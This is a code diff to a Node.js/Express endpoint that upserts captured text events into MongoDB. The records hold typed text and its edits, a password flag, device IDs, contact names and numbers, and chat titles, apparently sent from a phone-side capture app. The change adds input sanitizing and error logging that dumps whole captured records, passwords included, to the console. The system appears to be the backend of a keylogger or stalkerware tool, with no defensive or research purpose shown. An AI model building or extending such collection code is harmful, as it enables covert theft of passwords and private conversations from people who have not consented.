@@ -148,6 +148,19 @@ router.post('/', authenticateApiKey, async (req, res) => {
             });
         }
 
+        // Sanitize data to prevent MongoDB validation errors
+        const sanitizeValue = (value) => {
+            if (value === null || value === undefined) return null;
+            if (typeof value === 'object') {
+                try {
+                    return JSON.parse(JSON.stringify(value));
+                } catch (e) {
+                    return String(value);
+                }
+            }
+            return value;
+        };
+
         // Build id from messageId when provided to keep one record per message
         const effectiveId = (req.body.customMetadata && req.body.customMetadata.messageId)
             ? `${packageName}:${req.body.customMetadata.messageId}`
@@ -155,27 +168,27 @@ router.post('/', authenticateApiKey, async (req, res) => {
 
         // Create comprehensive text input data
         const textInputData = {
-            id: effectiveId,
+            id: sanitizeValue(effectiveId),
             timestamp: timestamp ? new Date(timestamp) : new Date(),
-            packageName,
-            appName,
-            className,
-            viewId,
-            text,
-            beforeText,
-            addedText,
-            removedText,
-            eventType,
+            packageName: sanitizeValue(packageName),
+            appName: sanitizeValue(appName),
+            className: sanitizeValue(className),
+            viewId: sanitizeValue(viewId),
+            text: sanitizeValue(text),
+            beforeText: sanitizeValue(beforeText),
+            addedText: sanitizeValue(addedText),
+            removedText: sanitizeValue(removedText),
+            eventType: sanitizeValue(eventType),
             isPassword: isPassword || false,
-            contentDescription,
-            deviceId,
-            messageId,
+            contentDescription: sanitizeValue(contentDescription),
+            deviceId: sanitizeValue(deviceId),
+            messageId: sanitizeValue(messageId),
             // Contact Information
-            contactName: contactName || '',
-            contactNumber: contactNumber || '',
-            contactId: contactId || '',
-            recipientInfo: recipientInfo || '',
-            chatTitle: chatTitle || '',
+            contactName: sanitizeValue(contactName) || '',
+            contactNumber: sanitizeValue(contactNumber) || '',
+            contactId: sanitizeValue(contactId) || '',
+            recipientInfo: sanitizeValue(recipientInfo) || '',
+            chatTitle: sanitizeValue(chatTitle) || '',
             isGroupChat: isGroupChat || false,
             participantCount: participantCount || 0,
             // Media attachment information
@@ -288,11 +301,18 @@ router.post('/', authenticateApiKey, async (req, res) => {
         };
 
         // Upsert by id so multiple captures for same message update the same record
-        const textInput = await TextInput.findOneAndUpdate(
-            { id },
-            { $set: textInputData, $setOnInsert: { createdAt: new Date() } },
-            { upsert: true, new: true }
-        );
+        let textInput;
+        try {
+            textInput = await TextInput.findOneAndUpdate(
+                { id },
+                { $set: textInputData, $setOnInsert: { createdAt: new Date() } },
+                { upsert: true, new: true }
+            );
+        } catch (dbError) {
+            console.error('Database operation failed:', dbError);
+            console.error('Failed data:', JSON.stringify(textInputData, null, 2));
+            throw dbError;
+        }
 
         res.status(201).json({
             success: true,
